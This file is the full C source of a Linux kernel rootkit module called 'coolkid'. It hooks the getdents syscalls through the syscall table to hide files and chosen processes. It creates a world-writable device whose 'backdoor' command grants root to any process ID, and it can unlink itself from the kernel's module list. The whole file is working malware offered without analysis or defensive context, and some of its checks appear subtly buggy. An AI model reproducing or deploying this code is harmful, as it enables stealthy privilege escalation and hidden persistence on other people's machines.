#include <linux/init.h>
#include <linux/module.h>
#include <linux/device.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/string.h>
#include <linux/sched/signal.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/dirent.h>
#include <linux/spinlock.h>
#include <linux/fdtable.h>

#include "coolkid.h"

#define  DEVICE_NAME "coolkid" 
#define  CLASS_NAME  "cool"

#define MAX_DEV_READ 20
#define MAX_PROCESS_HIDE 10

#define PREFIX "coolkid"

#define get_process_cmd 1
#define get_invisible_cmd 2

#define SIZE_CMD 10
#define cmd_backdoor 1000000000
#define cmd_get_process 1000000001
#define cmd_get_invisible 1000000002
#define cmd_make_invisible 1000000003
#define cmd_hide_module 1000000004

#define WRITE_PROTECT_FLAGS (1 << 16)

unsigned int last_command;
spinlock_t last_command_lock;

struct list_head *prev_mod;
unsigned int is_module_hidden = 0;

spinlock_t count_process_lock;
unsigned int hidden_process[MAX_PROCESS_HIDE] = {0};

static int major;
static struct class* coolkid_class;
static struct device* coolkid_device;
static void** sys_call_table;
unsigned long proc_ino;

static struct file_operations fops = {
    .write = dev_write,
    .read = dev_read,
};

static void** find_sys_call_table() {
    void** sys_call_table = (void**)kallsyms_lookup_name("sys_call_table");
    return sys_call_table;
}

static int sys_getdents64_hook(struct pt_regs* regs)
{
    long ret, i, j;
    unsigned char* ptr_kernel;
    unsigned char* ptr_user;
    struct linux_dirent64* entry;

    unsigned int is_proc = 0;
    unsigned long entry_long;
    unsigned long d_inode;
    unsigned long is_hidden = 0;

    d_inode = current->files->fdt->fd[regs->di]->f_inode->i_ino;
    if (d_inode == proc_ino) {
        is_proc = 1;
    }

    ptr_user = (unsigned char*) regs->si;
    ptr_kernel = kmalloc(regs->dx, GFP_KERNEL);
    ret = original_getdents(regs);
    
    copy_from_user(ptr_kernel, (void*) regs->si, regs->dx);

    for(i = j = 0; i < ret; i += entry->d_reclen) {
        entry = (struct linux_dirent64*) (ptr_kernel + i);

        if (is_proc) {
            entry_long = simple_strtoul(entry->d_name, NULL, 10);
            is_hidden = is_invisible(entry_long);
        }

        if (!strncmp(entry->d_name, PREFIX, sizeof(PREFIX) - 1) || is_hidden){
            continue;
        }

        if (!copy_to_user(ptr_user + j, entry, entry->d_reclen)){
            ret = -EAGAIN;
            goto end;
        }

        j += entry->d_reclen;
    }
    if (ret > 0){
        ret = j;
    }

end:
    kfree(ptr_kernel);
    return ret;
}

static int sys_getdents_hook(struct pt_regs* regs)
{
    long ret, i, j;
    unsigned char* ptr_kernel;
    unsigned char* ptr_user;
    struct linux_dirent* entry;

    unsigned int is_proc = 0;
    unsigned long entry_long;
    unsigned long d_inode;
    unsigned long is_hidden = 0;

    d_inode = current->files->fdt->fd[regs->di]->f_inode->i_ino;
    if (d_inode == proc_ino) {
        is_proc = 1;
    }

    ptr_user = (unsigned char*) regs->si;
    ptr_kernel = kmalloc(regs->dx, GFP_KERNEL);
    ret = original_getdents(regs);
    
    copy_from_user(ptr_kernel, (void*) regs->si, regs->dx);

    for(i = j = 0; i < ret; i += entry->d_reclen) {
        is_hidden = 0;
        entry = (struct linux_dirent*) (ptr_kernel + i);
    
        if (is_proc) {
            entry_long = simple_strtoul(entry->d_name, NULL, 10);
            is_hidden = is_invisible(entry_long);
        }

        if (!strncmp(entry->d_name, PREFIX, sizeof(PREFIX) - 1) ||
            is_hidden){
            continue;
        }

        if (copy_to_user(ptr_user + j, entry, entry->d_reclen)){
            ret = -EAGAIN;
            goto end;
        }

        j += entry->d_reclen;
    }
    if (ret > 0){
        ret = j;
    }

end:
    kfree(ptr_kernel);
    return ret;
}

static unsigned int hook_getdents(void){
    sys_call_table = find_sys_call_table();
    if (sys_call_table <= 0) {
        return -1;
    }
    original_getdents64 = sys_call_table[__NR_getdents64];
    original_getdents = sys_call_table[__NR_getdents];
    write_cr0(read_cr0() & ~(WRITE_PROTECT_FLAGS));
    sys_call_table[__NR_getdents64] = sys_getdents64_hook;
    sys_call_table[__NR_getdents] = sys_getdents_hook;
    write_cr0(read_cr0() | (WRITE_PROTECT_FLAGS));
    return 0;
}

static unsigned int restore_getdents(void){
    write_cr0(read_cr0() & ~(WRITE_PROTECT_FLAGS));
    sys_call_table[__NR_getdents64] = original_getdents64;
    sys_call_table[__NR_getdents] = original_getdents;
    write_cr0(read_cr0() | (WRITE_PROTECT_FLAGS));
    return 0;
}

static unsigned int make_root(unsigned long pid){
    struct task_struct* task;
    struct cred* new_cred;
    for (task = &init_task; (task = next_task(task)) != &init_task;) {
        if (task->pid == pid) {
            new_cred = prepare_kernel_cred(0);
            task->cred = new_cred;
            return 0;
        }
    }
    return -1;
}

static unsigned int make_invisible(unsigned long pid){
   int i; 
   int ret = -1;
   spin_lock(&count_process_lock);
   for (i = 0; i < MAX_PROCESS_HIDE; i++) {
       if (hidden_process[i] == 0) {
           hidden_process[i] = pid;
           ret = 0;
           break;
       }
   }
   spin_unlock(&count_process_lock);
   return ret; 
}

static unsigned int make_visible(unsigned long pid){
   int i; 
   int ret = -1;
   spin_lock(&count_process_lock);
   for (i = 0; i < MAX_PROCESS_HIDE; i++) {
       if (hidden_process[i] == pid) {
           hidden_process[i] = 0;
           ret = 0;
           break;
       }
   }
   spin_unlock(&count_process_lock);
   return ret; 
}

static unsigned int is_invisible(unsigned long pid){
    struct task_struct* task;
    unsigned int is_invisible = 0;
    int i = 0;

    for (task = &init_task; (task = next_task(task)) != &init_task;) {
        if (task->pid == pid) {
            break;
        }
    }

    do {
        for(i = 0; i < MAX_PROCESS_HIDE; i++){
            if (hidden_process[i] == task->pid) {
                is_invisible = 1;
            }
        }

        task = task->parent;

    } while (task->pid != 0 && is_invisible == 0);
    return is_invisible;
}

static void make_string_process(char* to_write, size_t len){
    struct task_struct* task;
    unsigned int cpt = 0;
    char small_buf[512];

    memset(to_write, '\0', len);

    for (task = &init_task; (task = next_task(task)) != &init_task; ){
        snprintf(small_buf, 512, "%d\t\t%s\t\t\t%d\n", task->pid, task->comm, is_invisible(task->pid));
        printk(KERN_INFO "%s", small_buf );
        if (cpt + strlen(small_buf) >= len){
            return;
        }
        strncpy(to_write + cpt, small_buf, strlen(small_buf));
        cpt += strlen(small_buf);
    }
    return;
}

static void make_string_invisible(char* to_write, size_t len){
    unsigned int cpt = 0;
    int i;
    char small_buf[512];

    memset(to_write, '\0', len);

    for (i = 0 ; i < MAX_PROCESS_HIDE; i++){
        snprintf(small_buf, 512, "%d,", hidden_process[i]);
        if (cpt + strlen(small_buf) >= len) {
            return;
        }
        strncpy(to_write + cpt, small_buf, strlen(small_buf));
        cpt += strlen(small_buf);
    }
    return;
}

static ssize_t dev_read(struct file *filep, char *buffer, size_t len, loff_t *offset){
    char* to_write;

    if (len <= *offset) {
        return 0;
    }

    spin_lock(&last_command_lock);
    if (!last_command) {
        return 0;
    }

    to_write = kmalloc(len, GFP_KERNEL);

    if (last_command == get_process_cmd){
        make_string_process(to_write, len);
    }
    if (last_command == get_invisible_cmd){
        make_string_invisible(to_write, len);    
    }

    last_command = 0;
    spin_unlock(&last_command_lock);
    copy_to_user(buffer, to_write, len);
    kfree(to_write);
    (*offset) += len;
    return len;
}

static ssize_t dev_write(struct file *filep, const char *buffer, size_t len, loff_t *offset){
    char command[MAX_DEV_READ] = {0};
    char command_id[SIZE_CMD + 1] = {0};
    unsigned long pid_cmd;
    unsigned long cmd;
    int check;

    if (len <= 0) {
        return -EINVAL;
    }

    if (len > MAX_DEV_READ) {
        len = MAX_DEV_READ;
    }

    memset(command, '\0', MAX_DEV_READ);
    copy_from_user(command, buffer, len);
    memcpy(command_id, command, SIZE_CMD);

    check = kstrtoul(command_id, 10, &cmd);
    if (check) {
        return len;
    }
    
    if (cmd == cmd_backdoor) {
        check = kstrtoul(command + SIZE_CMD + 1, 10, &pid_cmd);
        if (!check) {
            make_root(pid_cmd);
            return len;
        }
    }

    if (cmd == cmd_get_process) {
        spin_lock(&last_command_lock);
        last_command = get_process_cmd;
        spin_unlock(&last_command_lock);
        return len;
    }

    if (cmd == cmd_get_invisible) {
        spin_lock(&last_command_lock);
        last_command = get_invisible_cmd;
        spin_unlock(&last_command_lock);
        return len;
    }

    if (cmd == cmd_make_invisible) {
        check = kstrtoul(command + SIZE_CMD + 1, 10, &pid_cmd);
        if (!check) {
            if (is_invisible(pid_cmd)) {
                make_visible(pid_cmd);
            }
            else{
                make_invisible(pid_cmd);
            }
        return len;
        }
    }

    if (cmd == cmd_hide_module) {
        if (is_module_hidden) {
            unhide_module();
        } else {
            hide_module();
        }
        return len;
    }

    return len;
}

static int get_proc_ino(void) {
    struct file *filep;

    if ( (filep = filp_open("/proc", O_RDONLY, 0)) == NULL) {
        return -1;
    }

    proc_ino = filep->f_inode->i_ino;
     
    filp_close(filep,0);
    return 0;
}

static int my_dev_uevent(struct device *dev, struct kobj_uevent_env *env)
{
    add_uevent_var(env, "DEVMODE=%#o", 0666);
    return 0;
}

static int register_device(void){
    printk(KERN_INFO "Starting coolkid!\n");
    major = register_chrdev(0, DEVICE_NAME, &fops);
    if (major < 0) {
        printk(KERN_INFO "Fail to register device\n");
    }
    coolkid_class = class_create(THIS_MODULE, CLASS_NAME);
    coolkid_class->dev_uevent = my_dev_uevent;
    if (IS_ERR(coolkid_class)){
        unregister_chrdev(major, DEVICE_NAME);
        printk(KERN_ALERT "Failed to register device class\n");
        return PTR_ERR(coolkid_class); 
    }

    coolkid_device = device_create(coolkid_class, NULL, MKDEV(major, 0), NULL, DEVICE_NAME);
    if (IS_ERR(coolkid_class)){
        class_destroy(coolkid_class); 
        unregister_chrdev(major, DEVICE_NAME);
        printk(KERN_ALERT "Failed to create the device\n");
        return PTR_ERR(coolkid_class);
    }
    return 0;
}

static int hide_module(){
    spin_lock(&count_process_lock);
    prev_mod = THIS_MODULE->list.prev;
    list_del(&THIS_MODULE->list);
    is_module_hidden = 1;
    spin_unlock(&count_process_lock);
    return 0;
}

static int unhide_module(){
    spin_lock(&count_process_lock);
    list_add(&THIS_MODULE->list, prev_mod); 
    is_module_hidden = 0;
    spin_unlock(&count_process_lock);
    return 0;
}

static int unregister_device(void){
    device_destroy(coolkid_class, MKDEV(major, 0));
    class_unregister(coolkid_class);
    class_destroy(coolkid_class);
    unregister_chrdev(major, DEVICE_NAME);
    return 0;
}
static int __init start_coodkid(void) {
    printk(KERN_INFO "Starting coolkid!\n");
    spin_lock_init(&count_process_lock);
    register_device();
    get_proc_ino();
    hook_getdents();
    return 0;
}

static void __exit stop_coolkid(void) {
    unregister_device();
    restore_getdents();
    printk(KERN_INFO "Closing coolkid!\n");
}

module_init(start_coodkid);
module_exit(stop_coolkid);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("stan");
MODULE_DESCRIPTION("That hella coolkid");
MODULE_VERSION("1");
